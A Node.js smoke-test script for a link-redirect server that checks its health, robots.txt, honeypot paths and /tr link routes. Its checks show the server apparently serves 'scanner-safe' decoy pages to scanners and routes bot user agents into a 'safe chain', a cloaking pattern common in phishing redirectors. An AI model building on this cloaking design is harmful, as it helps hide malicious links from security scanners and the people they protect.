#!/usr/bin/env node
/**
 * Smoke test — boots the server in test mode and curls a handful of endpoints
 * to make sure nothing is wired up wrong before deploying. Exit 0 on success.
 *
 * Usage:  node scripts/smoke.js
 */
'use strict';

process.env.NODE_ENV = 'test';
process.env.PORT = process.env.PORT || '40123';
process.env.JWT_SECRET = process.env.JWT_SECRET || 'smoke-test-secret-do-not-use-in-prod';
process.env.REDIRECTOR_SECRET = process.env.REDIRECTOR_SECRET || 'smoke-test-redirector-secret';
process.env.ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'smoke@example.com';

const http = require('http');

function get(path, opts = {}) {
    return new Promise((resolve, reject) => {
        const req = http.request({
            host: '127.0.0.1',
            port: process.env.PORT,
            method: opts.method || 'GET',
            path,
            headers: opts.headers || {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            timeout: 5000
        }, (res) => {
            let body = '';
            res.on('data', chunk => { body += chunk; });
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
        });
        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout: ' + path)); });
        if (opts.body) req.write(opts.body);
        req.end();
    });
}

async function main() {
    console.log('[SMOKE] Starting server...');
    // Require the server module — it boots automatically.
    require('../src/server.js');

    // Wait for listen
    await new Promise(r => setTimeout(r, 1500));

    let failures = 0;

    async function check(name, fn) {
        try {
            await fn();
            console.log(`[SMOKE] ✓ ${name}`);
        } catch (e) {
            failures++;
            console.error(`[SMOKE] ✗ ${name}: ${e.message}`);
        }
    }

    await check('GET /health returns 200 ok', async () => {
        const r = await get('/health');
        if (r.status !== 200) throw new Error('status ' + r.status);
        if (!r.body.includes('ok')) throw new Error('no ok in body: ' + r.body.slice(0, 100));
    });

    await check('GET /robots.txt returns text/plain', async () => {
        const r = await get('/robots.txt');
        if (r.status !== 200) throw new Error('status ' + r.status);
        if (!/text\/plain/.test(r.headers['content-type'] || '')) throw new Error('wrong content-type');
        if (!r.body.includes('User-agent')) throw new Error('robots body missing User-agent');
    });

    await check('GET /tr/v1/__nonexistent__ returns 404 (link not found)', async () => {
        const r = await get('/tr/v1/__smoke_test_missing__');
        if (r.status !== 404) throw new Error('status ' + r.status);
    });

    await check('Honeypot path /.env returns 404 with no info', async () => {
        const r = await get('/.env');
        if (r.status !== 404) throw new Error('status ' + r.status);
    });

    await check('Honeypot path /wp-login.php returns 404', async () => {
        const r = await get('/wp-login.php');
        if (r.status !== 404) throw new Error('status ' + r.status);
    });

    await check('POST /tr/v2/unlock without payload returns 200 scanner-safe', async () => {
        const r = await get('/tr/v2/unlock', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
        if (r.status !== 200) throw new Error('status ' + r.status);
        // should serve scanner-safe page
        if (!r.body.includes('Secure Access') && !r.body.includes('Verification')) throw new Error('not scanner-safe page');
    });

    await check('POST /tr/v2/challenge without token returns json error', async () => {
        const r = await get('/tr/v2/challenge', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
        if (r.status !== 200) throw new Error('status ' + r.status);
        const json = JSON.parse(r.body);
        if (!json.error) throw new Error('expected error in body');
    });

    await check('Bot UA on /tr/v1/<id> not crashed', async () => {
        const r = await get('/tr/v1/__bot_smoke__', {
            headers: { 'User-Agent': 'curl/7.68.0' }
        });
        // Either 404 (not found) or 302 (redirected into safe chain) is acceptable
        if (r.status !== 404 && r.status !== 302) throw new Error('unexpected status ' + r.status);
    });

    await check('Dashboard root /index.html or / serves HTML', async () => {
        const r = await get('/');
        if (r.status !== 200) throw new Error('status ' + r.status);
        // Must be the dashboard, not a link-domain 404
        if (r.body.includes('no service found')) throw new Error('northflank unrouted 404');
    });

    if (failures > 0) {
        console.error(`\n[SMOKE] ${failures} check(s) failed`);
        process.exit(1);
    }
    console.log('\n[SMOKE] All checks passed.');
    process.exit(0);
}

main().catch(e => {
    console.error('[SMOKE] Fatal error:', e);
    process.exit(1);
});
